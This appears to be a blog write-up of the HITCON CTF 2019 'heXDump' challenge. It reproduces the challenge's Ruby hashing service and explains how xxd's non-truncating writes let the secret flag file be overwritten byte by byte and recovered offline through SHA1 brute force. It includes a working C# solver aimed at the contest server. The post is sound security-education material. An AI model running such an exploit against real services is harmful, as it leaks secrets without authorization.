---
layout: post
title: "HITCON CTF 2019 Quals: Misc - heXDump"
modified: 2019-10-19
tags: hitconctf, hitconctf2019quals, misc
---

In this challenge we got some Ruby code which could execute various actions (`md5`, `sha1` and `aes`) on our input data which was provided in hex format and were converted to binary via the `xxd` utility.

## The challenge

This was the code:

```ruby
#!/usr/bin/env ruby
# encoding: ascii-8bit
# frozen_string_literal: true

require 'English'
require 'fileutils'
require 'securerandom'

FLAG_PATH = File.join(ENV['HOME'], 'flag')
DEFAULT_MODE = "sha1sum %s | awk '{ print $1 }'"

def setup
  STDOUT.sync = 0
  STDIN.sync = 0
  @mode = DEFAULT_MODE
  @file = '/tmp/' + SecureRandom.hex
  FileUtils.touch(@file)
  @key = output("sha256sum #{FLAG_PATH} | awk '{ print $1 }'").strip
  raise if @key.size != 32 * 2
end

def menu
  <<~MENU
    1) write
    2) read
    3) change output mode
    0) quit
  MENU
end

def output(cmd)
  IO.popen(cmd, &:gets)
end

def write
  puts 'Data? (In hex format)'
  data = gets
  return false unless data && !data.empty? && data.size < 0x1000

  IO.popen("xxd -r -ps - #{@file}", 'r+') do |f|
    f.puts data
    f.close_write
  end
  return false unless $CHILD_STATUS.success?

  true
end

def read
  unless File.exist?(@file)
    puts 'Write something first plz.'
    return true
  end

  puts output(format(@mode, @file))
  true
end

def mode_menu
  <<~MODE
    Which mode?
    - SHA1
    - MD5
    - AES
  MODE
end

def change_mode
  puts mode_menu
  @mode = case gets.strip.downcase
          when 'sha1' then "sha1sum %s | awk '{ print $1 }'"
          when 'md5' then "md5sum %s | awk '{ print $1 }'"
          when 'aes' then "openssl enc -aes-256-ecb -in %s -K #{@key} | xxd -ps"
          else DEFAULT_MODE
          end
end

def secret
  FileUtils.cp(FLAG_PATH, @file)
  true
end

def main_loop
  puts menu
  case gets.to_i
  when 1 then write
  when 2 then read
  when 3 then change_mode
  when 1337 then secret
  else false
  end
end

setup
begin
  loop while main_loop
  puts 'See ya!'
ensure
  FileUtils.rm_f(@file)
end 
```

## The bug

After looking into what the `English` module does and trying to find out if `xxd` or `md5sum` or `sha1sum` can be tricked into doing something nasty based only on the input binary, all of these turned out to be wrong paths of solving the challenge.

Fortunately I found quickly that `xxd` does not truncate the input file when it writes into the file, so this call `xxd -r -ps - #{@file}` will keep the `file`'s original content and only overwrites the first few bytes that we provide.

This could be checked quickly by executing the following commands:

```
1
Data? (In hex format)
4141

2
801c34269f74ed383fc97de33604b8a905adb635
```

This is the correct result as `sha1("AA")` is indeed `801c34269f74ed383fc97de33604b8a905adb635`.

But if continue with the following commands:

```
1
Data? (In hex format)
42

2
eb28d7ef234301a3371720ea0d790df1a9c4363a
```

Then we get `sha1("BA") == "eb28d7ef234301a3371720ea0d790df1a9c4363a"` instead of `sha1("B") == "eb28d7ef234301a3371720ea0d790df1a9c4363a"`.

Of course we can also see that using the secret, not listed command `1337` sets our input file to the flag's value.

## The plan

So the plan is to overwrite our flag byte-by-byte and get the SHA1 hash of all these values then bruteforce offline the original flag bytes again byte-by-byte.

Here is an example:

```
             -> hitcon{ABCD} = 4bdb33b36816d73ecc714d698f161a07b2b4b593
_            -> _itcon{ABCD} = 4a582a61504a0cfd5ba786c2fc820da999ee25b9
__           -> __tcon{ABCD} = 720b2d9b846a76ed1696eb6f5df744545bf98e52
...
__________   -> __________D} = 8cd1a0e13e00b87c89c157a5f209f4c695ea1dda
___________  -> ___________} = 5a57868331393a400ad0ad0b1934b6592cf01ca5
____________ -> ____________ = 207f54f7d86a61d551a6495ea3e8d90053003579
```

From now on, we can brute-force the bytes offline:

We know that `sha1("___________"  + one_byte)` should be `5a57868331393a400ad0ad0b1934b6592cf01ca5`, so we can try every 0-255 byte value and we will find out that `one_byte == '}'`.

Then we can try to brute-force the previous byte as we know that `sha1("__________"  + other_byte + "}")` should be `8cd1a0e13e00b87c89c157a5f209f4c695ea1dda` and we find out that `other_byte == 'D'`.

And so on...

## The solver code

The following code implements the previous bruteforcer and solves the challenge:

```csharp
var tcp = new TcpTextClient("13.113.205.160", 21700);

// set flag as input 
tcp.ReadUntilEnds("0) quit\n");
tcp.WriteLine("1337");

void SetInput(string newValue)
{
    tcp.ReadUntilEnds("0) quit\n");
    tcp.WriteLine("1");
    tcp.ReadUntilEnds("Data? (In hex format)\n");
    tcp.WriteLine(Conversion.BytesToHex(EncodingHelper.GetBytes(newValue)));
}

string GetHash()
{
    tcp.ReadUntilEnds("0) quit\n");
    tcp.WriteLine("2");
    return tcp.ReadLine();
}

string Sha1(string value) => Conversion.BytesToHex(SHA1.Create().ComputeHash(EncodingHelper.GetBytes(value)));

var values = new Stack<string>();
while (true)
{
    var overwrite = new string('_', values.Count);
    SetInput(overwrite);
    var current = GetHash();
    if (current == Sha1(overwrite)) // no more characters left from the flag
        break;
    Console.WriteLine($"Got hash '{overwrite}' => {current}");
    values.Push(current);
}

var flag = "";
while (values.Count > 0)
{
    var currEncoded = values.Pop();
    var win = (char)Enumerable.Range(0, 256).Single(x => Sha1(new string('_', values.Count) + (char)x + flag) == currEncoded);
    Console.WriteLine($"Found: {(byte)win} ('{win}')");
    flag = win + flag;
}

Console.WriteLine($"Flag = {flag}");
```

## The flag

The solver gave us the flag:

```
hitcon{xxd?XDD!ed45dc4df7d0b79}
```